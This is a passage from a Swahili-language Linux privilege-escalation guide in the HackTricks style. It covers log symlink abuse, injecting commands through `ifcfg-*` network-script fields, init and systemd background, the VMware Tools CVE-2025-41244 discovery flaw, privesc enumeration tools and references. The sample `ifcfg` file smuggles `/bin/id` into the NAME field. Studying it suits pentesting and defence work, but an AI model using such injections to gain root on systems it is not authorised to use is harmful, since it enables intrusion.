Udhaifu huu unafanana sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logi za nginx),** kwa hiyo ukigundua kuwa unaweza kubadilisha logi, angalia nani anayezisimamia na kama unaweza kuongeza upendeleo kwa kubadilisha logi hizo na symlink.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Rejeleo la udhaifu:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Faili ya `ifcfg-*` ni dalili ya kuchunguza iwapo mtumiaji mwenye upendeleo mdogo anaweza kuiunda au kuibadilisha **na** njia ya kuwezesha mtandao yenye upendeleo itasoma faili hiyo hasa. Thibitisha ruhusa zinazotumika za faili na directory, interface iliyochaguliwa, utekelezaji wa `ifup`/`ifdown` uliosakinishwa, na nani anayeziendesha. Faili inayoweza kuandikwa pekee haisababishi utekelezaji wa amri. [Mwongozo wa mitandao wa RHEL 7 wa Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) unatofautisha network scripts za zamani na NetworkManager: NetworkManager yenyewe haianzishi za zamani. [Nyaraka za RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) zinaeleza kuwa `ifup`/`ifdown` zake za msingi hutumia NetworkManager, ilhali kifurushi cha hiari cha zamani hutoa shell scripts.

Kwenye mfumo unaotumia kwa kweli scripts za zamani zenye upendeleo, assignment ya `ifcfg-*` isiyowekwa kwenye nukuu na inayotafsiriwa na shell, kama `NAME=`, inaweza kuvuka mpaka wa utekelezaji wa msimbo. Thibitisha parser, thamani na njia halisi ya kuwezesha mtandao; usihitimishe kuwa shell itaitafsiri kutokana na jina la faili au kuwepo kwa NetworkManager. Wrapper inayoruhusiwa na sudo, inayoandika ingizo la mtumiaji kwenye faili ya `ifcfg-*` kisha kuita `ifup` ya zamani, ni njia tofauti ya kuvuka mpaka huu hata kama mtumiaji hawezi kuhariri faili moja kwa moja.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

Saraka ya `/etc/init.d` ina **scripts** za System V init (SysVinit), **mfumo wa kawaida wa usimamizi wa huduma za Linux**. Ina scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` za huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zilizo ndani ya `/etc/rc?.d/`. Njia mbadala kwenye mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa **usimamizi wa huduma** ulioletwa na Ubuntu, unaotumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya kuhamia Upstart, scripts za SysVinit bado hutumika pamoja na usanidi wa Upstart kutokana na compatibility layer ya Upstart.

**systemd** ni mfumo wa kisasa wa uanzishaji na usimamizi wa huduma, unaotoa vipengele vya kina kama vile kuwasha daemon inapohitajika, usimamizi wa automount, na snapshots za hali ya mfumo. Hupanga faili katika `/usr/lib/systemd/` kwa vifurushi vya usambazaji na `/etc/systemd/system/` kwa marekebisho ya msimamizi, na kurahisisha mchakato wa usimamizi wa mfumo.<sup>[[21]](#references)</sup>

## Mbinu Nyingine

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kutoka kwenye Shells zilizozuiwa


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: matumizi mabaya ya manager-channel

Android rooting frameworks kwa kawaida hu-hook syscall ili kufichua utendaji wa kernel wenye upendeleo kwa manager ya userspace. Uthibitishaji dhaifu wa manager (kwa mfano, ukaguzi wa signature unaotegemea mpangilio wa FD au mifumo dhaifu ya nywila) unaweza kuruhusu app ya ndani kujifanya manager na kupata root kwenye vifaa ambavyo tayari vime-rootiwa. Jifunze zaidi na upate maelezo ya exploitation hapa:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Ugunduzi wa huduma ya VMware Tools LPE (CWE-426) kupitia exec inayotumia regex (CVE-2025-41244)

Ugunduzi wa huduma unaotumia regex katika VMware Tools/Aria Operations unaweza kutoa njia ya binary kutoka kwenye mistari ya amri ya mchakato na kuitekeleza kwa -v katika muktadha wenye upendeleo. Patterns zinazokubali ulinganifu mpana (kwa mfano, kutumia \S) zinaweza kulinganisha listeners zilizowekwa na mshambuliaji katika maeneo yanayoweza kuandikika (kwa mfano, /tmp/httpd), na kusababisha utekelezaji kama root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Jifunze zaidi na uone pattern ya jumla inayotumika kwa stacks nyingine za ugunduzi/ufuatiliaji hapa:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Ulinzi wa Usalama wa Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada Zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana za Linux/Unix Privesc

### **Zana bora ya kutafuta vectors za Linux local privilege escalation:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(chaguo la -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns kwenye Linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Mkusanyiko wa scripts zaidi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Privilege escalation kupitia Crontab UI, kutumia tena credentials za zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload ya .text_sig iliyoghushiwa kwa monitor inayoendeshwa na cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Kukwepa Neighborhood Watch (kunyakua sudo env_keep PATH)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Privilege escalation ya msingi ya Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Mwongozo wa Linux Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Shambulia na Linda: Mbinu za Linux Privilege Escalation za 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Hakuna aliyetarajia utekelezaji wa amri!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Mwongozo wa mazoezi ya maabara - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Vidokezo na mbinu za Linux Privilege Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Zana ya Linux Enumeration & Privilege Escalation](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket ni nini?](https://www.linux.com/news/what-socket/)
- [15] [Maelezo ya Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Ingia kwenye D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Sehemu ya 2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Jinsi ya kusimamia ACLs kwenye Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Kupata root kwenye Redhat/CentOS kupitia network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd ni nini?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection kupitia logs, mlolongo mzima)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Mwongozo wa GNU Bash – BASH_ENV (faili la uanzishaji lisilo la interactive)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (nakala ya cron ya pg_basebackup → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Ukiitaja, VMware huiinua (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Kupandishwa kwa Haki kupitia Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Udhaifu wa Sudo wa CVE-2025-32462 na CVE-2025-32463 wa kupandisha haki](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Saraka za Hifadhi ya PYC](https://peps.python.org/pep-3147/)
- [32] [Nyaraka za Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [Suala la polkit/polkit #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet ya @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Kurekodi nywila kwenye Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Maelezo ya hali ya race ya logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Nyaraka za Python 3.10 – `site` na faili za usanidi wa path](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
